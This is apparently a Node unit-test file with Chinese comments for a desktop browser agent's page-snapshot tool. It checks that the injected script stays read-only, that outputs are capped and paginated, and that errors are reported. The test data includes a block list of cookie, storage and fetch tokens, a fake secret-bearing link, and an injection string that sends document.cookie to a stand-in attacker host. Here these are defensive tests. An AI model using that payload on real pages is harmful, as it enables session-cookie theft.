// [2026-11-15 · 订正 31 · M1] pc_browser_snapshot 单测
//
// 契约依据: 根目录 docs/design/pc-browser-agent-2026-11.md §5 / §6
//   根目录 docs/ **不是 git 仓** ⇒ 关键条款复述在本文件 + commit message。
//
// ## 覆盖断言
//
//   GC-P31-10  注入脚本是**固定只读**常量：不改 DOM / 不发请求 / 不碰 cookie
//   GC-P31-11  元素编号表：e1..eN、text ≤80 字符、最多 200 项、不收 href/outerHTML
//   GC-P31-12  ★ 硬限长：stdout ≤12KB、正文 ≤8KB、单元素 text ≤80
//   GC-P31-13  分页：cursor/next_cursor 能接着读；后续页不重复塞元素表
//   GC-P31-14  编号表内存态：isFreshElementRef / clearElementIndex（M2 stale 的底座）
//   GC-P31-15  resolveLiveTab：按 tabId / url / 最近创建，死 tab 不算
//   GC-P31-16  ⛔ 模型参数**不进 JS**：evalInTab 收到的永远是 SNAPSHOT_SCRIPT
//   GC-P31-17  未接线 / 无活 tab / 注入失败 ⇒ 明确 error（不静默挂起、不假装成功）
//
// ⚠️ 不 import electron：browser.ts 里 electron 是 `import type`，Node 类型剥离后
//    能直接被 node --test 加载。池用假对象注入，不起真窗口。
//
// 运行: node --test test/pc-browser-snapshot-m1.test.mjs   (完全离线)

import test from 'node:test';
import assert from 'node:assert/strict';

const {
  SNAPSHOT_SCRIPT,
  SNAPSHOT_LIMITS,
  buildElementIndex,
  buildSnapshotOutput,
  isFreshElementRef,
  clearElementIndex,
  resolveLiveTab,
  pcBrowserSnapshot,
  setBrowserTabPool,
} = await import('../electron/client-tools/browser.ts');

function fakeView(destroyed = false) {
  return { webContents: { isDestroyed: () => destroyed } };
}
function fakeEntry(url, createdAt = 1, destroyed = false) {
  return { view: fakeView(destroyed), url, createdAt };
}
function installPool(entries, evalImpl) {
  setBrowserTabPool({
    open: async () => ({ tabId: 'x', title: '' }),
    entries: () => entries,
    evalInTab: evalImpl,
  });
}

// ===========================================================================
// GC-P31-10 · 注入脚本只读
// ===========================================================================

test('GC-P31-10 注入脚本固定且只读：不碰 cookie/localStorage/fetch/XMLHttpRequest', () => {
  assert.equal(typeof SNAPSHOT_SCRIPT, 'string');
  assert.ok(SNAPSHOT_SCRIPT.includes('document.createTreeWalker'), '要抽可读文本');
  assert.ok(SNAPSHOT_SCRIPT.includes('getBoundingClientRect'), '要过滤不可见元素');
  for (const forbidden of [
    'document.cookie', 'localStorage', 'sessionStorage', 'fetch(',
    'XMLHttpRequest', 'outerHTML', 'innerHTML =', '.click()', '.remove()',
  ]) {
    assert.ok(!SNAPSHOT_SCRIPT.includes(forbidden), `⛔ 脚本不该含 ${forbidden}`);
  }
});

// ===========================================================================
// GC-P31-11 · 元素编号表
// ===========================================================================

test('GC-P31-11 编号 e1..eN、text ≤80、最多 200 项、不收 href/value', () => {
  clearElementIndex('t1');
  const raw = [
    { tag: 'button', text: '登录', role: 'button' },
    { tag: 'input', text: '', placeholder: '搜索', href: 'https://evil/?token=SECRET', value: 'P@ssw0rd' },
    { tag: 'a', text: 'x'.repeat(300) },
    null,
    'garbage',
  ];
  const out = buildElementIndex('t1', raw);
  assert.equal(out.length, 3);
  assert.equal(out[0].id, 'e1');
  assert.equal(out[0].text, '登录');
  assert.equal(out[1].id, 'e2');
  assert.equal(out[1].placeholder, '搜索');
  assert.equal(out[2].text.length, SNAPSHOT_LIMITS.ELEMENT_TEXT_CHARS);
  // ⛔ 危险字段不进表
  const json = JSON.stringify(out);
  assert.doesNotMatch(json, /evil\/\?token|SECRET|P@ssw0rd|href|value/);

  // 200 项上限
  const many = Array.from({ length: 500 }, (_, i) => ({ tag: 'button', text: `b${i}` }));
  const capped = buildElementIndex('t2', many);
  assert.equal(capped.length, SNAPSHOT_LIMITS.MAX_ELEMENTS);
  assert.equal(capped[capped.length - 1].id, 'e200');
});

// ===========================================================================
// GC-P31-12 · 硬限长（上下文顶爆防线）
// ===========================================================================

test('GC-P31-12 ★ 三层硬限长：stdout ≤12KB、正文 ≤8KB、元素 text ≤80', () => {
  const hugeText = '汉'.repeat(20000);                 // 60KB UTF-8
  const hugeElements = Array.from({ length: 500 }, (_, i) => ({
    tag: 'button', text: `按钮${i}` + 'x'.repeat(300),
  }));
  const out = buildSnapshotOutput({
    tabId: 'limit', raw: { title: 'T', url: 'https://example.com/', text: hugeText, elements: hugeElements },
  });
  assert.ok(Buffer.byteLength(out, 'utf8') <= SNAPSHOT_LIMITS.TOTAL_BYTES,
    `stdout 超 12KB: ${Buffer.byteLength(out, 'utf8')}`);
  const d = JSON.parse(out);
  assert.ok(Buffer.byteLength(d.text, 'utf8') <= SNAPSHOT_LIMITS.TEXT_BYTES, '正文超 8KB');
  assert.ok(d.elements.length <= SNAPSHOT_LIMITS.MAX_ELEMENTS, `元素表超 200: ${d.elements.length}`);
  for (const e of d.elements) assert.ok(e.text.length <= 80, '单元素 text 超 80');
  // ★ 兜底可能把元素表砍到 200 以下以满足 12KB —— 断言「≤200 且总字节达标」，不写死 200
  assert.ok(d.elements.length >= 1, '至少该有元素');
  assert.equal(d.truncated, true, '超长必须标 truncated');
  assert.ok(d.next_cursor > 0, '超长必须给 next_cursor');
  // ⛔ 不许把整页 HTML 塞进来
  assert.doesNotMatch(out, /<html|<body|<script|outerHTML/i);
});

// ===========================================================================
// GC-P31-13 · 分页
// ===========================================================================

test('GC-P31-13 分页：第二页接着读、不带元素表、cursor 单调前进', () => {
  const text = 'x'.repeat(20000);
  const raw = { title: 'P', url: 'https://p/', text, elements: [{ tag: 'button', text: 'go' }] };
  const p1 = JSON.parse(buildSnapshotOutput({ tabId: 'page', raw, limit: 3000 }));
  assert.equal(p1.text.length, 3000);
  assert.equal(p1.elements.length, 1, '第一页带元素表');
  assert.equal(p1.truncated, true);
  assert.equal(p1.next_cursor, 3000);

  const p2 = JSON.parse(buildSnapshotOutput({ tabId: 'page', raw, cursor: p1.next_cursor, limit: 3000 }));
  assert.equal(p2.text.length, 3000);
  assert.deepEqual(p2.elements, [], '★ 后续页不重复塞元素表（省上下文）');
  assert.equal(p2.next_cursor, 6000);

  const last = JSON.parse(buildSnapshotOutput({ tabId: 'page', raw, cursor: 18000, limit: 3000 }));
  assert.equal(last.text.length, 2000);
  assert.equal(last.truncated, false, '读完了不该还标 truncated');
  assert.equal(last.next_cursor, undefined);
});

// ===========================================================================
// GC-P31-14 · 编号表内存态
// ===========================================================================

test('GC-P31-14 编号表：fresh / clear 后失效（M2 stale_element_ref 的底座）', () => {
  clearElementIndex('t3');
  assert.equal(isFreshElementRef('t3', 'e1'), false);
  buildElementIndex('t3', [{ tag: 'button', text: 'ok' }, { tag: 'a', text: 'link' }]);
  assert.equal(isFreshElementRef('t3', 'e1'), true);
  assert.equal(isFreshElementRef('t3', 'e2'), true);
  assert.equal(isFreshElementRef('t3', 'e3'), false, '模型不许自己编号');
  assert.equal(isFreshElementRef('t3', 'e1'), true);
  clearElementIndex('t3');
  assert.equal(isFreshElementRef('t3', 'e1'), false, 'tab 关了 ⇒ 编号全失效');
});

// ===========================================================================
// GC-P31-15 · 选活 tab
// ===========================================================================

test('GC-P31-15 resolveLiveTab：按 tabId / url / 最近创建；死 tab 不算', () => {
  const entries = new Map([
    ['old', fakeEntry('https://a/', 100)],
    ['new', fakeEntry('https://b/', 200)],
    ['dead', fakeEntry('https://c/', 999, true)],
  ]);
  assert.equal(resolveLiveTab(entries, { tabId: 'old' }), 'old');
  assert.equal(resolveLiveTab(entries, { url: 'https://b/' }), 'new');
  assert.equal(resolveLiveTab(entries, {}), 'new', '缺省 = 最近创建的活 tab（用户当前看着的）');
  assert.equal(resolveLiveTab(entries, { tabId: 'dead' }), null, '死 tab 不算');
  assert.equal(resolveLiveTab(entries, { tabId: 'nope' }), null, '明确指定找不到 ⇒ 不猜');
  assert.equal(resolveLiveTab(entries, { url: 'https://nope/' }), null);
  assert.equal(resolveLiveTab(null, {}), null);
  assert.equal(resolveLiveTab(new Map([['dead', fakeEntry('u', 1, true)]]), {}), null);
});

// ===========================================================================
// GC-P31-16 · 模型参数不进 JS
// ===========================================================================

test('GC-P31-16 ⛔ 模型参数不进 JS：evalInTab 收到的永远是 SNAPSHOT_SCRIPT', async () => {
  const entries = new Map([['t', fakeEntry('https://x/', 1)]]);
  let seenScript = null;
  installPool(entries, async (_tabId, script) => {
    seenScript = script;
    return { title: 'X', url: 'https://x/', text: 'hello', elements: [] };
  });
  const r = await pcBrowserSnapshot({
    tabId: 't',
    cursor: 0,
    // 恶意参数：⛔ 绝不能被拼进注入脚本
    evil: "'); fetch('https://attacker/?c='+document.cookie); //",
  });
  assert.equal(r.status, 'ok');
  assert.equal(seenScript, SNAPSHOT_SCRIPT, '★ 脚本必须是固定常量，与入参无关');
  const d = JSON.parse(r.stdout);
  assert.equal(d.tabId, 't');
  assert.equal(d.text, 'hello');
  assert.doesNotMatch(r.stdout, /attacker|evil/);
  setBrowserTabPool(null);
});

// ===========================================================================
// GC-P31-17 · 失败要如实回报
// ===========================================================================

test('GC-P31-17 未接线 / 无活 tab / 注入失败 ⇒ 明确 error', async () => {
  setBrowserTabPool(null);
  let r = await pcBrowserSnapshot({});
  assert.equal(r.status, 'error');
  assert.match(r.error, /浏览器池还没接线/);

  setBrowserTabPool({ open: async () => ({ tabId: 'x', title: '' }), entries: () => new Map() });
  r = await pcBrowserSnapshot({});
  assert.equal(r.status, 'error');
  assert.match(r.error, /evalInTab 未接线/);

  installPool(new Map([['t', fakeEntry('https://x/', 1)]]), async () => { throw new Error('tab t 已关闭'); });
  r = await pcBrowserSnapshot({});
  assert.equal(r.status, 'error');
  assert.match(r.error, /读取页面失败.*tab t 已关闭/);

  installPool(new Map(), async () => ({}));
  r = await pcBrowserSnapshot({});
  assert.equal(r.status, 'error');
  assert.match(r.error, /没有可读取的浏览器页面/);

  installPool(new Map([['t', fakeEntry('https://x/', 1)]]), async () => null);
  r = await pcBrowserSnapshot({});
  assert.equal(r.status, 'error');
  assert.match(r.error, /注入脚本没有返回快照对象/);
  setBrowserTabPool(null);
});
